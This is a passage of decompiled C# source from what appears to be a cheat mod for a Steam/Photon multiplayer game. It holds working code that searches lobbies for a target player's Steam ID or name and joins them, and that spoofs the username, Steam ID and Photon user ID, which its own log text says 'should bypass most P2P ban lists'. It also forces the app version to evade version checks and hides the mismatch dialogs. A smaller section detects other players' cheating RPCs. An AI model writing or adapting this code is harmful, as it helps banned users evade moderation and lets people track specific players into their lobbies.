						if (!string.IsNullOrEmpty(friendPersonaName))
						{
							list2.Add(friendPersonaName);
							if (!string.IsNullOrEmpty(SearchUsername) && friendPersonaName.ToLower().Contains(SearchUsername))
							{
								flag = true;
							}
						}
					}
					if (SearchSteamID != 0 && flag2)
					{
						isSearchingLobbies = false;
						LastJoinMessage = $"Found player with Steam ID {SearchSteamID} in lobby {num3}, joining...";
						Debug.Log((object)$"[LobbyJoiner] Found target player, joining lobby {num3}");
						SearchSteamID = 0uL;
						JoinLobbyByID(num3);
						return;
					}
					if ((SearchSteamID == 0L && string.IsNullOrEmpty(SearchUsername)) || flag)
					{
						CSteamID lobbyOwner = SteamMatchmaking.GetLobbyOwner(lobbyByIndex);
						string text = ((lobbyOwner != CSteamID.Nil) ? SteamFriends.GetFriendPersonaName(lobbyOwner) : "Unknown");
						LobbySearchResult lobbySearchResult = default(LobbySearchResult);
						lobbySearchResult.lobbyID = lobbyByIndex.m_SteamID;
						lobbySearchResult.hostName = text;
						lobbySearchResult.memberCount = numLobbyMembers;
						lobbySearchResult.memberNames = list2;
						LobbySearchResult item = lobbySearchResult;
						list.Add(item);
						Debug.Log((object)$"[LobbyJoiner] Found lobby: {lobbyByIndex.m_SteamID} with host '{text}' ({numLobbyMembers} players)");
					}
				}
				list.Sort((LobbySearchResult a, LobbySearchResult b) => b.memberCount.CompareTo(a.memberCount));
				searchResults = list;
				if (SearchSteamID != 0L)
				{
					LastJoinMessage = $"Steam ID {SearchSteamID} not found in any public lobbies (checked {num} lobbies). They may be in a private lobby or offline.";
				}
				else if (string.IsNullOrEmpty(SearchUsername))
				{
					if (searchResults.Count > 0)
					{
						LastJoinMessage = $"Found {searchResults.Count} available lobby/lobbies (sorted by player count)";
					}
					else
					{
						LastJoinMessage = $"No public lobbies found (checked {num} lobbies)";
					}
				}
				else if (searchResults.Count > 0)
				{
					LastJoinMessage = $"Found {searchResults.Count} matching lobby/lobbies out of {num} checked";
				}
				else
				{
					LastJoinMessage = $"No lobbies found with username '{SearchUsername}' (checked {num} lobbies)";
				}
				SearchSteamID = 0uL;
			}
			catch (Exception ex)
			{
				isSearchingLobbies = false;
				LastJoinMessage = "Error processing search results: " + ex.Message;
				Debug.LogError((object)("[LobbyJoiner] Error in OnLobbyMatchList: " + ex.Message + "\n" + ex.StackTrace));
			}
		}

		public static bool JoinSearchResult(int resultIndex)
		{
			if (resultIndex < 0 || resultIndex >= searchResults.Count)
			{
				LastJoinMessage = "Invalid search result index";
				return false;
			}
			return JoinLobbyByID(searchResults[resultIndex].lobbyID);
		}

		public static bool SearchFriendsLobbiesByUsername(string username)
		{
			if (string.IsNullOrEmpty(username))
			{
				LastJoinMessage = "Username cannot be empty";
				return false;
			}
			try
			{
				searchResults.Clear();
				string value = username.ToLower();
				int friendCount = SteamFriends.GetFriendCount((EFriendFlags)65535);
				int num = 0;
				int num2 = 0;
				LastJoinMessage = $"Searching {friendCount} friends for '{username}'...";
				Debug.Log((object)$"[LobbyJoiner] Searching {friendCount} friends for '{username}'");
				FriendGameInfo_t val = default(FriendGameInfo_t);
				for (int i = 0; i < friendCount; i++)
				{
					CSteamID friendByIndex = SteamFriends.GetFriendByIndex(i, (EFriendFlags)65535);
					if (friendByIndex == CSteamID.Nil || !SteamFriends.GetFriendGamePlayed(friendByIndex, ref val) || val.m_steamIDLobby.m_SteamID == 0L)
					{
						continue;
					}
					num++;
					CSteamID steamIDLobby = val.m_steamIDLobby;
					int numLobbyMembers = SteamMatchmaking.GetNumLobbyMembers(steamIDLobby);
					List<string> list = new List<string>();
					bool flag = false;
					for (int j = 0; j < numLobbyMembers; j++)
					{
						CSteamID lobbyMemberByIndex = SteamMatchmaking.GetLobbyMemberByIndex(steamIDLobby, j);
						if (!(lobbyMemberByIndex != CSteamID.Nil))
						{
							continue;
						}
						string friendPersonaName = SteamFriends.GetFriendPersonaName(lobbyMemberByIndex);
						if (!string.IsNullOrEmpty(friendPersonaName))
						{
							list.Add(friendPersonaName);
							if (friendPersonaName.ToLower().Contains(value))
							{
								flag = true;
							}
						}
					}
					if (flag)
					{
						string friendPersonaName2 = SteamFriends.GetFriendPersonaName(friendByIndex);
						LobbySearchResult lobbySearchResult = default(LobbySearchResult);
						lobbySearchResult.lobbyID = steamIDLobby.m_SteamID;
						lobbySearchResult.hostName = friendPersonaName2;
						lobbySearchResult.memberCount = numLobbyMembers;
						lobbySearchResult.memberNames = list;
						LobbySearchResult item = lobbySearchResult;
						searchResults.Add(item);
						num2++;
						Debug.Log((object)$"[LobbyJoiner] Found matching lobby in friend's game: {steamIDLobby.m_SteamID}");
					}
				}
				if (num2 > 0)
				{
					LastJoinMessage = $"Found {num2} matching lobby/lobbies in friends' games";
				}
				else
				{
					LastJoinMessage = $"No lobbies found with '{username}' in friends' games (checked {num} lobbies)";
				}
				return true;
			}
			catch (Exception ex)
			{
				LastJoinMessage = "Error: " + ex.Message;
				Debug.LogError((object)("[LobbyJoiner] Error searching friends' lobbies: " + ex.Message + "\n" + ex.StackTrace));
				return false;
			}
		}
	}
	public static class SteamSpoofing
	{
		private delegate string GetUsernameDelegate();

		private delegate CSteamID GetSteamIDDelegate();

		private delegate(string, HAuthTicket) GetSteamAuthTicketDelegate();

		public static bool SpoofEnabled = false;

		public static string SpoofedUsername = "Player";

		public static ulong SpoofedSteamID = 0uL;

		public static string SpoofedPhotonUserID = "";

		private static MethodInfo originalGetUsername;

		private static MethodInfo originalGetSteamID;

		private static MethodInfo originalLoadUserID;

		private static MethodInfo originalGetSteamAuthTicket;

		private static Type networkingUtilitiesType;

		private static Type steamUserType;

		private static Type steamAuthTicketServiceType;

		private static bool initialized = false;

		private static bool methodsPatched = false;

		private const int MAX_PHOTON_NICKNAME_LENGTH = 32767;

		public static void Initialize()
		{
			if (initialized)
			{
				return;
			}
			try
			{
				Assembly[] assemblies = AppDomain.CurrentDomain.GetAssemblies();
				for (int i = 0; i < assemblies.Length; i++)
				{
					networkingUtilitiesType = assemblies[i].GetType("Peak.Network.NetworkingUtilities");
					if (networkingUtilitiesType != null)
					{
						break;
					}
				}
				assemblies = AppDomain.CurrentDomain.GetAssemblies();
				for (int i = 0; i < assemblies.Length; i++)
				{
					steamUserType = assemblies[i].GetType("Steamworks.SteamUser");
					if (steamUserType != null)
					{
						break;
					}
				}
				assemblies = AppDomain.CurrentDomain.GetAssemblies();
				for (int i = 0; i < assemblies.Length; i++)
				{
					steamAuthTicketServiceType = assemblies[i].GetType("SteamAuthTicketService");
					if (steamAuthTicketServiceType != null)
					{
						break;
					}
				}
				if (networkingUtilitiesType != null)
				{
					originalGetUsername = networkingUtilitiesType.GetMethod("GetUsername", BindingFlags.Static | BindingFlags.Public);
					originalLoadUserID = networkingUtilitiesType.GetMethod("LoadUserID", BindingFlags.Static | BindingFlags.Public);
				}
				if (steamUserType != null)
				{
					originalGetSteamID = steamUserType.GetMethod("GetSteamID", BindingFlags.Static | BindingFlags.Public);
				}
				if (steamAuthTicketServiceType != null)
				{
					originalGetSteamAuthTicket = steamAuthTicketServiceType.GetMethod("GetSteamAuthTicket", BindingFlags.Static | BindingFlags.Public);
				}
				initialized = true;
				Debug.Log((object)"[SteamSpoofing] Initialized successfully");
			}
			catch (Exception ex)
			{
				Debug.LogError((object)("[SteamSpoofing] Failed to initialize: " + ex.Message + "\n" + ex.StackTrace));
			}
		}

		public static void SetSpoofingEnabled(bool enabled)
		{
			if (!initialized)
			{
				Initialize();
			}
			SpoofEnabled = enabled;
			if (enabled)
			{
				ApplySpoofing();
			}
			else
			{
				RemoveSpoofing();
			}
		}

		private static void ApplySpoofing()
		{
			try
			{
				if (SpoofedSteamID == 0L)
				{
					SpoofedSteamID = GenerateRandomSteamID();
				}
				if (string.IsNullOrEmpty(SpoofedPhotonUserID))
				{
					SpoofedPhotonUserID = Guid.NewGuid().ToString();
				}
				PatchGameMethods();
				if (PhotonNetwork.IsConnected)
				{
					string text2 = (PhotonNetwork.NickName = ((SpoofedUsername.Length > 32767) ? SpoofedUsername.Substring(0, 32767) : SpoofedUsername));
					Debug.Log((object)$"[SteamSpoofing] Set Photon nickname to: {text2} (length: {text2.Length})");
				}
				if (PhotonNetwork.AuthValues != null)
				{
					PhotonNetwork.AuthValues.UserId = SpoofedPhotonUserID;
					Debug.Log((object)("[SteamSpoofing] Set Photon UserID to: " + SpoofedPhotonUserID));
				}
				PlayerPrefs.SetString("UserID", SpoofedPhotonUserID);
				PlayerPrefs.Save();
				Debug.Log((object)$"[SteamSpoofing] Spoofing applied - Username: {SpoofedUsername}, SteamID: {SpoofedSteamID}, PhotonID: {SpoofedPhotonUserID}");
				Debug.Log((object)"[SteamSpoofing] P2P MODE: Since this is P2P, other players see your Photon UserId, not your Steam ID directly!");
				Debug.Log((object)"[SteamSpoofing] Your spoofed Photon UserId will be sent to other players via PublishUserId=true");
				Debug.LogWarning((object)"[SteamSpoofing] Note: If other players check Steam ID client-side, they may still see your real Steam ID. But Photon UserId spoofing should bypass most P2P ban lists!");
			}
			catch (Exception ex)
			{
				Debug.LogError((object)("[SteamSpoofing] Failed to apply spoofing: " + ex.Message + "\n" + ex.StackTrace));
			}
		}

		private static void PatchGameMethods()
		{
			if (methodsPatched)
			{
				return;
			}
			try
			{
				if (!PhotonNetwork.IsConnected)
				{
					if (PhotonNetwork.AuthValues == null)
					{
						PhotonNetwork.AuthValues = new AuthenticationValues();
					}
					PhotonNetwork.AuthValues.UserId = SpoofedPhotonUserID;
					string text2 = (PhotonNetwork.NickName = ((SpoofedUsername.Length > 32767) ? SpoofedUsername.Substring(0, 32767) : SpoofedUsername));
					Debug.Log((object)$"[SteamSpoofing] Pre-configured Photon with spoofed values (nickname length: {text2.Length})");
				}
				if (!string.IsNullOrEmpty(SpoofedPhotonUserID))
				{
					PlayerPrefs.SetString("UserID", SpoofedPhotonUserID);
					PlayerPrefs.Save();
					Debug.Log((object)("[SteamSpoofing] Patched PlayerPrefs UserID to: " + SpoofedPhotonUserID));
				}
				methodsPatched = true;
				Debug.Log((object)"[SteamSpoofing] Game methods patched for P2P spoofing");
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[SteamSpoofing] Could not patch game methods: " + ex.Message));
			}
		}

		private static void RemoveSpoofing()
		{
			try
			{
				methodsPatched = false;
				if (PhotonNetwork.IsConnected && SteamManager.Initialized)
				{
					try
					{
						string text = (PhotonNetwork.NickName = SteamFriends.GetPersonaName());
						Debug.Log((object)("[SteamSpoofing] Restored Photon nickname to: " + text));
					}
					catch
					{
					}
				}
				Debug.Log((object)"[SteamSpoofing] Spoofing removed");
			}
			catch (Exception ex)
			{
				Debug.LogError((object)("[SteamSpoofing] Failed to remove spoofing: " + ex.Message + "\n" + ex.StackTrace));
			}
		}

		public static void SetSpoofedSteamID(ulong steamID)
		{
			SpoofedSteamID = steamID;
			if (SpoofedSteamID == 0L)
			{
				SpoofedSteamID = GenerateRandomSteamID();
			}
			Debug.Log((object)$"[SteamSpoofing] Set spoofed Steam ID to: {SpoofedSteamID}");
		}

		public static ulong GetCurrentSteamID()
		{
			if (SpoofEnabled && SpoofedSteamID != 0L)
			{
				return SpoofedSteamID;
			}
			try
			{
				if (SteamManager.Initialized)
				{
					return SteamUser.GetSteamID().m_SteamID;
				}
			}
			catch
			{
			}
			return 0uL;
		}

		public static void SetSpoofedUsername(string username)
		{
			if (string.IsNullOrEmpty(username))
			{
				SpoofedUsername = "Player";
			}
			else if (username.Length > 32767)
			{
				SpoofedUsername = username.Substring(0, 32767);
				Debug.LogWarning((object)$"[SteamSpoofing] Username truncated from {username.Length} to {32767} characters to prevent Photon join issues");
			}
			else
			{
				SpoofedUsername = username;
			}
			if (SpoofEnabled && PhotonNetwork.IsConnected)
			{
				PhotonNetwork.NickName = SpoofedUsername;
				Debug.Log((object)$"[SteamSpoofing] Updated spoofed username to: {SpoofedUsername} (length: {SpoofedUsername.Length})");
			}
		}

		public static void SetSpoofedPhotonUserID(string userID)
		{
			if (string.IsNullOrEmpty(userID))
			{
				SpoofedPhotonUserID = Guid.NewGuid().ToString();
			}
			else
			{
				SpoofedPhotonUserID = userID;
			}
			if (SpoofEnabled)
			{
				if (PhotonNetwork.AuthValues != null)
				{
					PhotonNetwork.AuthValues.UserId = SpoofedPhotonUserID;
				}
				PlayerPrefs.SetString("UserID", SpoofedPhotonUserID);
				PlayerPrefs.Save();
				Debug.Log((object)("[SteamSpoofing] Updated spoofed Photon UserID to: " + SpoofedPhotonUserID));
			}
		}

		public static ulong GenerateRandomSteamID()
		{
			Random random = new Random();
			ulong num = 76561190000000000uL;
			ulong num2 = (ulong)random.Next(10000000, 99999999);
			return num + num2;
		}

		public static string GetCurrentUsername()
		{
			if (SpoofEnabled)
			{
				return SpoofedUsername;
			}
			try
			{
				if (SteamManager.Initialized)
				{
					return SteamFriends.GetPersonaName();
				}
			}
			catch
			{
			}
			return PhotonNetwork.NickName ?? "Player";
		}

		public static string GetCurrentPhotonUserID()
		{
			if (SpoofEnabled && !string.IsNullOrEmpty(SpoofedPhotonUserID))
			{
				return SpoofedPhotonUserID;
			}
			if (PhotonNetwork.AuthValues != null)
			{
				return PhotonNetwork.AuthValues.UserId;
			}
			if (PlayerPrefs.HasKey("UserID"))
			{
				return PlayerPrefs.GetString("UserID");
			}
			return "";
		}

		public static void Update()
		{
			if (SpoofEnabled)
			{
				if (SpoofedSteamID == 0L)
				{
					SpoofedSteamID = GenerateRandomSteamID();
				}
				if (string.IsNullOrEmpty(SpoofedPhotonUserID))
				{
					SpoofedPhotonUserID = Guid.NewGuid().ToString();
				}
				if (PhotonNetwork.AuthValues == null && PhotonNetwork.NetworkingClient != null)
				{
					PhotonNetwork.AuthValues = new AuthenticationValues();
				}
				if (PhotonNetwork.AuthValues != null && PhotonNetwork.AuthValues.UserId != SpoofedPhotonUserID)
				{
					PhotonNetwork.AuthValues.UserId = SpoofedPhotonUserID;
					Debug.Log((object)("[SteamSpoofing] Forced Photon UserID to: " + SpoofedPhotonUserID));
				}
				string text = ((SpoofedUsername.Length > 32767) ? SpoofedUsername.Substring(0, 32767) : SpoofedUsername);
				if (PhotonNetwork.NickName != text)
				{
					PhotonNetwork.NickName = text;
					Debug.Log((object)$"[SteamSpoofing] Forced Photon NickName to: {text} (length: {text.Length})");
				}
				if (PlayerPrefs.GetString("UserID") != SpoofedPhotonUserID)
				{
					PlayerPrefs.SetString("UserID", SpoofedPhotonUserID);
				}
			}
		}

		public static void ResetPhotonUserID()
		{
			SpoofedPhotonUserID = Guid.NewGuid().ToString();
			SetSpoofedPhotonUserID(SpoofedPhotonUserID);
		}
	}
	public static class VersionBypass
	{
		private static bool initialized = false;

		private static string originalAppVersion = "";

		private static PropertyInfo appVersionProperty = null;

		private static FieldInfo appVersionField = null;

		private static float lastDialogCheckTime = 0f;

		private const float dialogCheckInterval = 0.5f;

		private static string detectedHostVersion = null;

		private static FieldInfo internalAppVersionField = null;

		private static PropertyInfo internalAppVersionProperty = null;

		public static void Initialize()
		{
			if (initialized)
			{
				return;
			}
			try
			{
				originalAppVersion = PhotonNetwork.AppVersion;
				Type typeFromHandle = typeof(PhotonNetwork);
				appVersionProperty = typeFromHandle.GetProperty("AppVersion", BindingFlags.Static | BindingFlags.Public);
				if (appVersionProperty == null)
				{
					appVersionField = typeFromHandle.GetField("AppVersion", BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
				}
				FindInternalVersionFields(typeFromHandle);
				Debug.Log((object)("[VersionBypass] Initialized. Original version: " + originalAppVersion));
				initialized = true;
				if (CheatConfig.VersionBypassEnabled)
				{
					SetAppVersion("1.46");
				}
			}
			catch (Exception ex)
			{
				Debug.LogError((object)("[VersionBypass] Error initializing: " + ex.Message));
			}
		}

		private static void FindInternalVersionFields(Type photonNetworkType)
		{
			try
			{
				FieldInfo[] fields = photonNetworkType.GetFields(BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
				foreach (FieldInfo fieldInfo in fields)
				{
					string text = fieldInfo.Name.ToLower();
					if ((text.Contains("appversion") || text.Contains("app_version") || text.Contains("version")) && fieldInfo.FieldType == typeof(string))
					{
						internalAppVersionField = fieldInfo;
						Debug.Log((object)("[VersionBypass] Found internal version field: " + fieldInfo.Name));
					}
				}
				PropertyInfo[] properties = photonNetworkType.GetProperties(BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
				foreach (PropertyInfo propertyInfo in properties)
				{
					string text2 = propertyInfo.Name.ToLower();
					if ((text2.Contains("appversion") || text2.Contains("app_version") || text2.Contains("version")) && propertyInfo.PropertyType == typeof(string))
					{
						internalAppVersionProperty = propertyInfo;
						Debug.Log((object)("[VersionBypass] Found internal version property: " + propertyInfo.Name));
					}
				}
			}
			catch (Exception ex)
			{
				Debug.LogWarning((object)("[VersionBypass] Error finding internal version fields: " + ex.Message));
			}
		}

		public static void Update()
		{
			if (!CheatConfig.VersionBypassEnabled)
			{
				return;
			}
			try
			{
				if (!initialized)
				{
					Initialize();
				}
				string text = DetectHostVersionFromDialogs();
				if (text != null)
				{
					detectedHostVersion = text;
				}
				string text2 = detectedHostVersion ?? "1.46";
				if (PhotonNetwork.AppVersion != text2)
				{
					SetAppVersion(text2);
				}
				HideVersionDialog();
			}
			catch (Exception ex)
			{
				Debug.LogError((object)("[VersionBypass] Error in Update: " + ex.Message));
			}
		}

		private static string DetectHostVersionFromDialogs()
		{
			try
			{
				GameObject[] array = Object.FindObjectsByType<GameObject>(FindObjectsSortMode.None);
				foreach (GameObject val in array)
				{
					if (val == null || !val.activeInHierarchy)
					{
						continue;
					}
					TextMeshProUGUI[] componentsInChildren = val.GetComponentsInChildren<TextMeshProUGUI>(true);
					foreach (TextMeshProUGUI val2 in componentsInChildren)
					{
						if (val2 != null && ((TMP_Text)val2).text != null)
						{
							string text = ExtractHostVersion(((TMP_Text)val2).text);
							if (text != null)
							{
								return text;
							}
						}
					}
					Text[] componentsInChildren2 = val.GetComponentsInChildren<Text>(true);
					foreach (Text val3 in componentsInChildren2)
					{
						if (val3 != null && val3.text != null)
						{
							string text2 = ExtractHostVersion(val3.text);
							if (text2 != null)
							{
								return text2;
							}
						}
					}
				}
			}
			catch
			{
			}
			return null;
		}

		private static string ExtractHostVersion(string text)
		{
			try
			{
				string text2 = text.ToLower();
				if (text2.Contains("host has different game version") || text2.Contains("version mismatch") || text2.Contains("game version mismatch"))
				{
					int num = text.IndexOf("version:", StringComparison.OrdinalIgnoreCase);
					if (num == -1)
					{
						num = text.IndexOf("version", StringComparison.OrdinalIgnoreCase);
					}
					if (num >= 0)
					{
						int num2 = text.IndexOf('[', num);
						if (num2 >= 0)
						{
							int num3 = text.IndexOf(']', num2);
							if (num3 > num2)
							{
								string text3 = text.Substring(num2 + 1, num3 - num2 - 1).Trim();
								if (Regex.IsMatch(text3, "^\\d+\\.\\d+$"))
								{
									Debug.Log((object)("[VersionBypass] Detected host version from dialog: " + text3));
									return text3;
								}
							}
						}
					}
					Match match = Regex.Match(text, "\\[?(\\d+\\.\\d+)\\]?");
					if (match.Success)
					{
						string value = match.Groups[1].Value;
						Debug.Log((object)("[VersionBypass] Detected host version from text: " + value));
						return value;
					}
				}
			}
			catch
			{
			}
			return null;
		}

		private static void HideVersionDialog()
		{
			try
			{
				float time = Time.time;
				if (time - lastDialogCheckTime < 0.5f)
				{
					return;
				}
				lastDialogCheckTime = time;
				GameObject[] array = Object.FindObjectsByType<GameObject>(FindObjectsSortMode.None);
				foreach (GameObject val in array)
				{
					if (val == null || !val.activeInHierarchy)
					{
						continue;
					}
					string text = ((Object)val).name.ToLower();
					if (!text.Contains("version") && !text.Contains("update") && !text.Contains("dialog") && !text.Contains("outofdate"))
					{
						continue;
					}
					bool flag = false;
					TextMeshProUGUI[] componentsInChildren = val.GetComponentsInChildren<TextMeshProUGUI>(true);
					foreach (TextMeshProUGUI val2 in componentsInChildren)
					{
						if (val2 != null && ((TMP_Text)val2).text != null)
						{
							string text2 = ((TMP_Text)val2).text.ToLower();
							if (text2.Contains("version out of date") || text2.Contains("close and update") || text2.Contains("game version mismatch") || text2.Contains("version mismatch") || text2.Contains("host has different game version") || text2.Contains("version"))
							{
								flag = true;
								break;
							}
						}
					}
					if (!flag)
					{
						Text[] componentsInChildren2 = val.GetComponentsInChildren<Text>(true);
						foreach (Text val3 in componentsInChildren2)
						{
							if (val3 != null && val3.text != null)
							{
								string text3 = val3.text.ToLower();
								if (text3.Contains("version out of date") || text3.Contains("close and update") || text3.Contains("game version mismatch") || text3.Contains("version mismatch") || text3.Contains("host has different game version") || text3.Contains("version"))
								{
									flag = true;
									break;
								}
							}
						}
					}
					if (flag)
					{
						val.SetActive(false);
						Debug.Log((object)("[VersionBypass] Hid version dialog: " + ((Object)val).name));
					}
				}
			}
			catch
			{
			}
		}

		private static void SetAppVersion(string version)
		{
			try
			{
				bool flag = false;
				if (appVersionProperty != null)
				{
					appVersionProperty.SetValue(null, version);
					Debug.Log((object)("[VersionBypass] Set AppVersion to: " + version + " (via public property)"));
					flag = true;
				}
				if (appVersionField != null)
				{
					appVersionField.SetValue(null, version);
					Debug.Log((object)("[VersionBypass] Set AppVersion to: " + version + " (via public field)"));
					flag = true;
				}
				if (internalAppVersionProperty != null && internalAppVersionProperty.CanWrite)
				{
					try
					{
						internalAppVersionProperty.SetValue(null, version);
						Debug.Log((object)("[VersionBypass] Set AppVersion to: " + version + " (via internal property)"));
						flag = true;
					}
					catch
					{
					}
				}
				if (internalAppVersionField != null)
				{
					try
					{
						internalAppVersionField.SetValue(null, version);
						Debug.Log((object)("[VersionBypass] Set AppVersion to: " + version + " (via internal field)"));
						flag = true;
					}
					catch
					{
					}
				}
				try
				{
					if (PhotonNetwork.PhotonServerSettings != null && PhotonNetwork.PhotonServerSettings.AppSettings != null)
					{
						PhotonNetwork.PhotonServerSettings.AppSettings.AppVersion = version;
						Debug.Log((object)("[VersionBypass] Set PhotonServerSettings.AppSettings.AppVersion to: " + version));
						flag = true;
					}
				}
				catch (Exception ex)
				{
					Debug.LogWarning((object)("[VersionBypass] Could not set PhotonServerSettings.AppSettings.AppVersion: " + ex.Message));
				}
				try
				{
					Type type = typeof(PhotonNetwork).Assembly.GetType("Photon.Realtime.LoadBalancingClient");
					if (type != null)
					{
						FieldInfo field = type.GetField("AppVersion", BindingFlags.Instance | BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
						if (field != null)
						{
							PropertyInfo property = typeof(PhotonNetwork).GetProperty("NetworkingClient", BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
							if (property != null)
							{
								object value = property.GetValue(null);
								if (value != null)
								{
									field.SetValue(value, version);
									Debug.Log((object)("[VersionBypass] Set AppVersion in LoadBalancingClient to: " + version));
									flag = true;
								}
							}
						}
					}
				}
				catch (Exception ex2)
				{
					Debug.LogWarning((object)("[VersionBypass] Could not set version in LoadBalancingClient: " + ex2.Message));
				}
				if (!flag)
				{
					Debug.LogWarning((object)"[VersionBypass] Could not find any AppVersion property/field to set");
				}
			}
			catch (Exception ex3)
			{
				Debug.LogError((object)("[VersionBypass] Error setting AppVersion: " + ex3.Message));
			}
		}

		public static bool ShouldBypassJoinError(short returnCode, string message)
		{
			if (!CheatConfig.VersionBypassEnabled)
			{
				return false;
			}
			if (message != null)
			{
				string text = message.ToLower();
				if (text.Contains("version") || text.Contains("mismatch"))
				{
					string text2 = ExtractHostVersion(message);
					if (text2 != null)
					{
						detectedHostVersion = text2;
						Debug.Log((object)("[VersionBypass] Detected host version from error: " + text2));
						SetAppVersion(text2);
					}
					Debug.Log((object)$"[VersionBypass] Detected version mismatch error: {message} (ReturnCode: {returnCode})");
					return true;
				}
			}
			return false;
		}

		public static void RestoreOriginalVersion()
		{
			if (!string.IsNullOrEmpty(originalAppVersion))
			{
				SetAppVersion(originalAppVersion);
				Debug.Log((object)("[VersionBypass] Restored original version: " + originalAppVersion));
			}
		}

		public static string GetDetectedHostVersion()
		{
			return detectedHostVersion;
		}

		public static void EnsureVersionSet()
		{
			if (!CheatConfig.VersionBypassEnabled)
			{
				return;
			}
			try
			{
				string text = detectedHostVersion ?? "1.46";
				if (PhotonNetwork.AppVersion != text)
				{
					SetAppVersion(text);
				}
			}
			catch (Exception ex)
			{
				Debug.LogError((object)("[VersionBypass] Error ensuring version set: " + ex.Message));
			}
		}
	}
	public static class CheaterDetection
	{
		private static Dictionary<string, Dictionary<string, int>> playerRPCCounts = new Dictionary<string, Dictionary<string, int>>();

		private static Dictionary<string, float> playerRPCTimestamps = new Dictionary<string, float>();

		private static Dictionary<string, Dictionary<string, object>> playerLastRPCData = new Dictionary<string, Dictionary<string, object>>();

		private const float RPC_RATE_CHECK_INTERVAL = 1f;

		private const int MAX_RPC_PER_SECOND = 20;

		private const float SUSPICIOUS_RPC_COOLDOWN = 5f;

		private static Dictionary<string, float> lastDetectionTime = new Dictionary<string, float>();

		public static void Initialize()
		{
			try
			{
				HookPhotonRPC();
			}
			catch (Exception ex)
			{
				Debug.LogError((object)("[CheaterDetection] Failed to initialize: " + ex.Message));
			}
		}

		private static void HookPhotonRPC()
		{
			try
			{
				if (typeof(PhotonNetwork).GetMethod("LoadLevel", BindingFlags.Static | BindingFlags.Public) != null)
				{
					Debug.Log((object)"[CheaterDetection] Photon RPC hook initialized");
				}
			}
			catch
			{
			}
		}

		public static void OnRPCReceived(string playerName, string rpcMethodName, object[] parameters, PhotonView view)
		{
			if (!CheatConfig.CheaterDetectionEnabled || string.IsNullOrEmpty(playerName) || view == null || view.IsMine)
			{
				return;
			}
			try
			{
				float time = Time.time;
				if (!playerRPCCounts.ContainsKey(playerName))
				{
					playerRPCCounts[playerName] = new Dictionary<string, int>();
					playerRPCTimestamps[playerName] = time;
					playerLastRPCData[playerName] = new Dictionary<string, object>();
				}
				if (!playerRPCCounts[playerName].ContainsKey(rpcMethodName))
				{
					playerRPCCounts[playerName][rpcMethodName] = 0;
				}
				playerRPCCounts[playerName][rpcMethodName]++;
				if (time - playerRPCTimestamps[playerName] >= 1f)
				{
					int num = playerRPCCounts[playerName].Values.Sum();
					if (num > 20)
					{
						DetectCheater(playerName, $"Excessive RPC rate: {num}/sec");
					}
					playerRPCCounts[playerName].Clear();
					playerRPCTimestamps[playerName] = time;
				}
				CheckSuspiciousRPC(playerName, rpcMethodName, parameters, view);
			}
			catch
			{
			}
		}

		private static void CheckSuspiciousRPC(string playerName, string rpcMethodName, object[] parameters, PhotonView view)
		{
			try
			{
				if (!lastDetectionTime.ContainsKey(playerName) || !(Time.time - lastDetectionTime[playerName] < 5f))
				{
					if (CheatConfig.DetectionType_ImpossibleRevive && CheckImpossibleRevive(playerName, rpcMethodName, parameters, view))
					{
						DetectCheater(playerName, "Impossible revive RPC");
					}
					else if (CheatConfig.DetectionType_ImpossibleTeleport && CheckImpossibleTeleport(playerName, rpcMethodName, parameters, view))
					{
						DetectCheater(playerName, "Impossible teleport RPC");
					}
					else if (CheatConfig.DetectionType_UnauthorizedItemControl && CheckUnauthorizedItemControl(playerName, rpcMethodName, parameters, view))
					{
						DetectCheater(playerName, "Unauthorized item control RPC");
					}
					else if (CheatConfig.DetectionType_ImpossibleStatus && CheckImpossibleStatus(playerName, rpcMethodName, parameters, view))
					{
						DetectCheater(playerName, "Impossible status manipulation RPC");
					}
					else if (CheatConfig.DetectionType_ImpossibleItemSpawn && CheckImpossibleItemSpawn(playerName, rpcMethodName, parameters, view))
					{
						DetectCheater(playerName, "Impossible item spawn RPC");
					}
				}
			}
			catch
			{
			}
		}

		private static bool CheckImpossibleRevive(string playerName, string rpcMethodName, object[] parameters, PhotonView view)
		{
			if (rpcMethodName == "RPCA_Revive" || rpcMethodName == "RPCA_ReviveAtPosition")
			{
				try
				{
					Character val = ((view != null) ? ((Component)view).GetComponent<Character>() : null);
					if (val != null && val.data != null && !val.data.dead && !val.data.fullyPassedOut)
					{
						return true;
					}
				}
				catch
				{
				}
			}
			return false;
		}

		private static bool CheckImpossibleTeleport(string playerName, string rpcMethodName, object[] parameters, PhotonView view)
		{
			if (rpcMethodName == "WarpPlayerRPC" || rpcMethodName == "RPCA_ReviveAtPosition")
			{
				try
				{
					if (parameters != null && parameters.Length != 0 && parameters[0] is Vector3)
					{
						Vector3 val = (Vector3)parameters[0];
						Character val2 = ((view != null) ? ((Component)view).GetComponent<Character>() : null);
						if (val2 != null && Vector3.Distance(val2.Center, val) > 500f)
						{
							return true;
						}
					}
				}
				catch
				{
				}
			}
			return false;
		}

		private static bool CheckUnauthorizedItemControl(string playerName, string rpcMethodName, object[] parameters, PhotonView view)
		{
			if (rpcMethodName == "SetKinematicRPC" || rpcMethodName == "SetKinematicAndResetSyncData")
			{
				try
				{
					Item val = ((view != null) ? ((Component)view).GetComponent<Item>() : null);
					if (val != null)
					{
						if (val.holderCharacter == null || (Object)(object)val.holderCharacter.photonView == (Object)null)
						{
							return true;
						}
						Player owner = val.holderCharacter.photonView.Owner;
						if (((owner != null) ? owner.NickName : null) != playerName)
						{
							return true;
						}
					}
				}
				catch
				{
				}
			}
			return false;
		}

		private static bool CheckImpossibleStatus(string playerName, string rpcMethodName, object[] parameters, PhotonView view)
		{
			if (rpcMethodName.Contains("Status") || rpcMethodName.Contains("Affliction"))
			{
				try
				{
					Character val = ((view != null) ? ((Component)view).GetComponent<Character>() : null);
					if (val != null && (Object)(object)val.photonView != (Object)null && !val.photonView.IsMine && rpcMethodName == "SyncStatusesRPC" && parameters != null && parameters.Length != 0)
					{
						return true;
					}
				}
				catch
				{
				}
			}
			return false;
		}

		private static bool CheckImpossibleItemSpawn(string playerName, string rpcMethodName, object[] parameters, PhotonView view)
		{
			if (rpcMethodName.Contains("Spawn") || rpcMethodName.Contains("Instantiate"))
			{
				try
				{
